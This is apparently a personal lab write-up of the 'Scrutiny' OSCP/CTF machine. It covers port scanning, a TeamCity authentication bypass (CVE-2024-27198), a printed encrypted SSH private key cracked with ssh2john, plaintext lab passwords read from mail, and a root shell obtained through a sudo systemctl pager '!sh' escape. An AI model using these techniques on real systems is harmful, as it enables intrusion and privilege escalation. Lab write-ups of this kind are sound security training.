# CTF-Writeups-

# Scrutiny

Nmap: 

```
┌──(kali㉿piggy)-[~/OSCP/labs/Linux/Scrutiny]
└─$ nmap -sV -sC -p- 192.168.118.91 --min-rate=1000 -o nmap
Starting Nmap 7.99 ( https://nmap.org ) at 2026-09-04 20:21 +1000
Nmap scan report for 192.168.118.91
Host is up (0.17s latency).
Not shown: 65531 filtered tcp ports (no-response)
PORT    STATE  SERVICE VERSION
22/tcp  open   ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 62:36:1a:5c:d3:e3:7b:e1:70:f8:a3:b3:1c:4c:24:38 (RSA)
|   256 ee:25:fc:23:66:05:c0:c1:ec:47:c6:bb:00:c7:4f:53 (ECDSA)
|_  256 83:5c:51:ac:32:e5:3a:21:7c:f6:c2:cd:93:68:58:d8 (ED25519)
25/tcp  open   smtp    Postfix smtpd
| ssl-cert: Subject: commonName=onlyrands.com
| Subject Alternative Name: DNS:onlyrands.com
| Not valid before: 2024-06-07T09:33:24
|_Not valid after:  2034-06-05T09:33:24
|_smtp-commands: onlyrands.com, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8, CHUNKING
|_ssl-date: TLS randomness does not represent time
80/tcp  open   http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: OnlyRands
443/tcp closed https
Service Info: Host:  onlyrands.com; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .

```

![Screenshot 2026-09-04 at 8.23.51 pm.png](Scrutiny/Screenshot_2026-09-04_at_8_23_51_pm.png)

Port 80: 

![Screenshot 2026-09-04 at 8.29.34 pm.png](Scrutiny/Screenshot_2026-09-04_at_8_29_34_pm.png)

Version 2023.05.4 

Vulnerability: **CVE-2023-42793**

According to Rapid7’s report, you can exploit the vulnerability using the following path and appending \RPC2:

![Screenshot 2026-09-04 at 8.57.01 pm.png](Scrutiny/Screenshot_2026-09-04_at_8_57_01_pm.png)

However, when attempting to exploit the target, I get the following response: 

![Screenshot 2026-09-04 at 8.57.28 pm.png](Scrutiny/Screenshot_2026-09-04_at_8_57_28_pm.png)

Attempting to access or delete the session token doesn’t work:

```
┌──(kali㉿ldinsle123)-[~/OSCP/labs/Linux/Scrutiny]
└─$ curl -X DELETE http://teams.onlyrands.com/login.html/app/rest/users/id:1/tokens/RPC2
<!doctype html><html lang="en"><head><title>HTTP Status 405 – Method Not Allowed</title><style type="text/css">body {font-family:Tahoma,Arial,sans-serif;} h1, h2, h3, b {color:white;background-color:#525D76;} h1 {font-size:22px;} h2 {font-size:16px;} h3 {font-size:14px;} p {font-size:12px;} a {color:black;} .line {height:1px;background-color:#525D76;border:none;}</style></head><body><h1>HTTP Status 405 – Method Not Allowed</h1></body></html>                                                                                  
┌──(kali㉿ldinsle123)-[~/OSCP/labs/Linux/Scrutiny]
└─$ curl -X POST http://teams.onlyrands.com/login.html/app/rest/users/id:1/tokens/RPC2       
<!doctype html><html lang="en"><head><title>HTTP Status 404 – Not Found</title><style type="text/css">body {font-family:Tahoma,Arial,sans-serif;} h1, h2, h3, b {color:white;background-color:#525D76;} h1 {font-size:22px;} h2 {font-size:16px;} h3 {font-size:14px;} p {font-size:12px;} a {color:black;} .line {height:1px;background-color:#525D76;border:none;}</style></head><body><h1>HTTP Status 404 – Not Found</h1></body></html
```

Peeped at the brief like a fucking donkey and saw CVE 2024 … 

Read a report on **`TeamCity Auth bypass to RCE (CVE-2024-27198 and CVE-2024-27199)`** effecting all versions prior to `2023.11.4` 

[https://www.vicarius.io/vsociety/posts/teamcity-auth-bypass-to-rce-cve-2024-27198-and-cve-2024-27199](https://www.vicarius.io/vsociety/posts/teamcity-auth-bypass-to-rce-cve-2024-27198-and-cve-2024-27199)

While reading the blog on the vulnerability, it provided a POC by hitting the endpoint /app/rest/server without needing to authenticate:

![Screenshot 2026-09-06 at 7.20.10 pm.png](Scrutiny/Screenshot_2026-09-06_at_7_20_10_pm.png)

The report then also gives us a POC that takes advantage of this vulnerability at the endpoint /app/rest/users and adds the user vsoc with Sys admin privileges: 

![Screenshot 2026-09-06 at 7.20.22 pm.png](Scrutiny/Screenshot_2026-09-06_at_7_20_22_pm.png)

This results in us able to login as a Sys admin and while looking around we find a commit titled oops: 

![Screenshot 2026-09-06 at 7.19.55 pm.png](Scrutiny/Screenshot_2026-09-06_at_7_19_55_pm.png)

The file contains a private RSA key: 

![Screenshot 2026-09-06 at 7.24.46 pm.png](Scrutiny/Screenshot_2026-09-06_at_7_24_46_pm.png)

I created a file with the RSA private key, however using the private key to SSH did not work and a password was required: 

![Screenshot 2026-09-14 at 7.42.09 pm.png](Scrutiny/Screenshot_2026-09-14_at_7_42_09_pm.png)

```
┌──(kali㉿ldinsle123)-[~/OSCP/labs/Linux/Scrutiny]
└─$ cat id_rsa      
-----BEGIN OPENSSH PRIVATE KEY-----
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
9EHV94yVIeYQzmagUFXqPqFVMSM=
-----END OPENSSH PRIVATE KEY-----

```

So I used johntheripper ot convert the private key file into the hash to crack 

![Screenshot 2026-09-14 at 7.43.16 pm.png](Scrutiny/Screenshot_2026-09-14_at_7_43_16_pm.png)

```
┌──(kali㉿ldinsle123)-[~/OSCP/labs/Linux/Scrutiny]
└─$ ssh2john id_rsa > rsa_hash.txt

                                                                                                             
```

After cracking the hash we got the credential ‘cheer’ and was able to gain an SSH shell: 

![Screenshot 2026-09-14 at 7.54.50 pm.png](Scrutiny/Screenshot_2026-09-14_at_7_54_50_pm.png)

Found a mail item which revealed a plaintext password: 

```
marcot@onlyrands:/var/mail$ cat marcot
From matthewa@onlyrands.com  Fri Jun  7 09:33:48 2024
Return-Path: <matthewa@onlyrands.com>
X-Original-To: marcot@onlyrands.com
Delivered-To: marcot@onlyrands.com
Received: by onlyrands.com (Postfix, from userid 1010)
        id E8D713650; Fri,  7 Jun 2024 09:33:48 +0000 (UTC)
From: matthewa@onlyrands.com
To: marcot@onlyrands.com
Subject: Goodbye, best friend
Date: Fri,  18 Feb 2022 08:43:11 (UTC)
MIME-Version: 1.0
Content-Type: text/plain; charset="UTF-8"
Content-Transfer-Encoding: 8bit
Message-Id: <20240607093348.E8D713650@onlyrands.com>

Marco,

Dach, the imbecile, forgot to disable my access, so you can login using my account. The password is "IdealismEngineAshen476" (without the quotation marcot).

I've left you a parting gift--your eyes only.
I'm gonna miss you, pal. Catch you on the flip side.

Sincerely,
Matthew A.

From matthewa@onlyrands.com  Fri Jun  7 09:33:48 2024
Return-Path: <matthewa@onlyrands.com>
X-Original-To: marcot@onlyrands.com
Delivered-To: marcot@onlyrands.com
Received: by onlyrands.com (Postfix, from userid 1010)
        id F07F4366A; Fri,  7 Jun 2024 09:33:48 +0000 (UTC)
From: matthewa@onlyrands.com
To: kathleenw@onlyrands.com, marcot@onlyrands.com,
    matthewa@onlyrands.com, patriciam@onlyrands.com
Subject: Goodbye!
Cc: bobbyp@onlyrands.com, danab@onlyrands.com, susanw@onlyrands.com
Date: Fri,  18 Feb 2022 08:50:03 (UTC)
MIME-Version: 1.0
Content-Type: text/plain; charset="UTF-8"
Content-Transfer-Encoding: 8bit
Message-Id: <20240607093348.F07F4366A@onlyrands.com>

Dear randos,

Like most things in life, good things must come to an end. My access has been terminated, so I thought I'd send you this very last email to say goodbye.

You have been like a family to me for as long as I can remember, and since our we're not supposed to communicate outside of work, I hope that maybe one day you will remember me.

Marco, I have faith you will become an excellent leader for the team.

Take care, everyone. Goodbye!

Sincerely,
Matthew A.

From marcot@onlyrands.com  Fri Jun  7 09:33:49 2024
Return-Path: <marcot@onlyrands.com>
X-Original-To: freelancers
Delivered-To: freelancers@onlyrands.com
Received: by onlyrands.com (Postfix, from userid 1012)
        id 0555F367C; Fri,  7 Jun 2024 09:33:49 +0000 (UTC)
From: marcot@onlyrands.com
To: williamw@onlyrands.com
Subject: Welcome, new freelancer!
Cc: operations@onlyrands.com, freelancers@onlyrands.com
Date: Mon,  21 Feb 2022 09:26:56 (UTC)
MIME-Version: 1.0
Content-Type: text/plain; charset="UTF-8"
Content-Transfer-Encoding: 8bit
Message-Id: <20240607093349.0555F367C@onlyrands.com>

Hi William,

Welcome to the team. I just talked to Sonja about giving you a virtual tour of what we do at OnlyRands, so please be ready to go once Kathleen's given you the orientation session on how to use TeamCity.

Best,
Marco T.

From edgarm@onlyrands.com  Fri Jun  7 09:33:49 2024
Return-Path: <edgarm@onlyrands.com>
X-Original-To: marcot@onlyrands.com
Delivered-To: marcot@onlyrands.com
Received: by onlyrands.com (Postfix, from userid 1001)
        id 0D5E136A0; Fri,  7 Jun 2024 09:33:49 +0000 (UTC)
From: edgarm@onlyrands.com
To: marcot@onlyrands.com
Subject: Congratulations
Date: Mon,  21 Feb 2022 11:07:49 (UTC)
MIME-Version: 1.0
Content-Type: text/plain; charset="UTF-8"
Content-Transfer-Encoding: 8bit
Message-Id: <20240607093349.0D5E136A0@onlyrands.com>

Hi Marco,

Congratulations on your promotion to department chief. I trust you will have William W. under control, as well as your shameful numbers. Get work done.

Regards,
Macejkovic

From sonjas@onlyrands.com  Fri Jun  7 09:33:49 2024
Return-Path: <sonjas@onlyrands.com>
X-Original-To: marcot@onlyrands.com
Delivered-To: marcot@onlyrands.com
Received: by onlyrands.com (Postfix, from userid 1002)
        id 1C94636A0; Fri,  7 Jun 2024 09:33:49 +0000 (UTC)
From: sonjas@onlyrands.com
To: marcot@onlyrands.com
Subject: FIX YOUR NUMBERS
Date: Thu,  24 Feb 2022 16:24:51 (UTC)
MIME-Version: 1.0
Content-Type: text/plain; charset="UTF-8"
Content-Transfer-Encoding: 8bit
Message-Id: <20240607093349.1C94636A0@onlyrands.com>

Marco,

If you don't get those numbers up by the end of the quarter, you and your team are going to make up for it in unpaid overtime.

Regards,
Stamm

```

Using the password I was able to gain an ssh connection using matthewa’s account:

![Screenshot 2026-09-14 at 8.00.34 pm.png](Scrutiny/Screenshot_2026-09-14_at_8_00_34_pm.png)

while on matthews account I discovered another plaintext password in a hidden directory: 

![Screenshot 2026-09-14 at 8.04.08 pm.png](Scrutiny/Screenshot_2026-09-14_at_8_04_08_pm.png)

Username related to ‘Dach’

password is RefriedScabbedWasting502

Dach is Brian D. Knew it was a nickname and brain was the only one with a D as the first letter of his last name: 

![Screenshot 2026-09-14 at 8.41.13 pm.png](Scrutiny/Screenshot_2026-09-14_at_8_41_13_pm.png)

Linpeas show what looks like a possible vector through sudo: 

```
╔══════════╣ Checking 'sudo -l', /etc/sudoers, and /etc/sudoers.d
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#sudo-and-suid                                 
Matching Defaults entries for briand on onlyrands:                                                                              
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User briand may run the following commands on onlyrands:
    (root) NOPASSWD: /usr/bin/systemctl status teamcity-server.service

```

GTFObins has a priv esc vector for systemctl

![Screenshot 2026-09-14 at 8.47.00 pm.png](Scrutiny/Screenshot_2026-09-14_at_8_47_00_pm.png)

```
echo '[Service]
Type=oneshot
ExecStart=/bin/sh
[Install]
WantedBy=multi-user.target' > /temp-file.service
```

NOTHINGS WORKING 

```
briand@onlyrands:~$ cat /usr/lib/systemd/system/teamcity-server.service
[Unit]
Description=TeamCity Server
After=network.target

[Service]
Type=forking
User=git
Group=git
Environment="CATALINA_PID=/srv/git/software/TeamCity/logs/teamcity.pid"
ExecStart=/srv/git/software/TeamCity/bin/teamcity-server.sh start
ExecStop=/srv/git/software/TeamCity/bin/teamcity-server.sh stop force
SuccessExitStatus=0 1
TimeoutSec=60s
Restart=on-failure

[Install]
WantedBy=multi-user.target
briand@onlyrands:~$ ls -la /usr/lib/systemd/system/teamcity-server.service
-rw-r--r-- 1 root root 401 Jun  7  2024 /usr/lib/systemd/system/teamcity-server.service
briand@onlyrands:~$ ls -la /etc/systemd/system/multi-user.target.wants/teamcity-server.service
lrwxrwxrwx 1 root root 43 Jun  7  2024 /etc/systemd/system/multi-user.target.wants/teamcity-server.service -> /lib/systemd/system/teamcity-server.service
briand@onlyrands:~$ vim /etc/systemd/system/multi-user.target.wants/teamcity-server.service
briand@onlyrands:~$ vim /etc/systemd/system/multi-user.target.wants/teamcity-server.service

briand@onlyrands:~$ find / -iname 'teamcity-server.service' 2>/dev/null 
/sys/fs/cgroup/pids/system.slice/teamcity-server.service
/sys/fs/cgroup/devices/system.slice/teamcity-server.service
/sys/fs/cgroup/memory/system.slice/teamcity-server.service
/sys/fs/cgroup/systemd/system.slice/teamcity-server.service
/sys/fs/cgroup/unified/system.slice/teamcity-server.service
/usr/lib/systemd/system/teamcity-server.service
/etc/systemd/system/multi-user.target.wants/teamcity-server.service

```

```

╔══════════╣ Systemd Information
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#systemd-path---relative-paths                 
═╣ Systemd version and vulnerabilities? .............. 245.4                                                                    
3.23
═╣ Services running as root? ..... 
═╣ Running services with dangerous capabilities? ... 
═╣ Services with writable paths? . networkd-dispatcher.service: Uses relative path '$networkd_dispatcher_args' (from ExecStart=/usr/bin/networkd-dispatcher $networkd_dispatcher_args)                                                                          
rsyslog.service: Uses relative path '-n' (from ExecStart=/usr/sbin/rsyslogd -n -iNONE)
teamcity-server.service: Uses relative path 'start' (from ExecStart=/srv/git/software/TeamCity/bin/teamcity-server.sh start)

```

[https://gist.github.com/A1vinSmith/78786df7899a840ec43c5ddecb6a4740](https://gist.github.com/A1vinSmith/78786df7899a840ec43c5ddecb6a4740)

https://medium.com/@zenmoviefornotification/saidov-maxim-cve-2023-26604-c1232a526ba7

The vulnerability is related to the terminal size of the given shell and way systemctl handles the output. If the terminal is small enough it uses pager instead of cat, which then can be leveraged to execute commands: 

![Screenshot 2026-09-14 at 10.16.06 pm.png](Scrutiny/Screenshot_2026-09-14_at_10_16_06_pm.png)

```
briand@onlyrands:/$ sudo systemctl status teamcity-server.service
● teamcity-server.service - TeamCity Server
     Loaded: loaded (/lib/systemd/system/teamcity-server.service; enabled; vendor preset: enabled)
     Active: active (running) since Mon 2024-08-05 17:15:20 UTC; 2 years 1 months ago
   Main PID: 832 (sh)
      Tasks: 156 (limit: 2255)
     Memory: 789.9M
     CGroup: /system.slice/teamcity-server.service
             ├─ 832 sh teamcity-server.sh _start_internal
             ├─ 841 sh /srv/git/software/TeamCity/bin/teamcity-server-restarter.sh run
             ├─1207 /usr/lib/jvm/java-1.11.0-openjdk-amd64/bin/java -Djava.util.logging.config.file=/srv/git/software/TeamCity/conf/logging.p>
             └─1781 /usr/lib/jvm/java-11-openjdk-amd64/bin/java -DTCSubProcessName=TeamCityMavenServer -classpath /srv/git/software/TeamCity/>

Aug 05 17:15:20 onlyrands.com systemd[1]: Starting TeamCity Server...
Aug 05 17:15:20 onlyrands.com teamcity-server.sh[792]: Spawning TeamCity restarter in separate process
Aug 05 17:15:20 onlyrands.com teamcity-server.sh[792]: TeamCity restarter running with PID 832
Aug 05 17:15:20 onlyrands.com systemd[1]: Started TeamCity Server.
!sh
# whoami | id
uid=0(root) gid=0(root) groups=0(root)
# 

```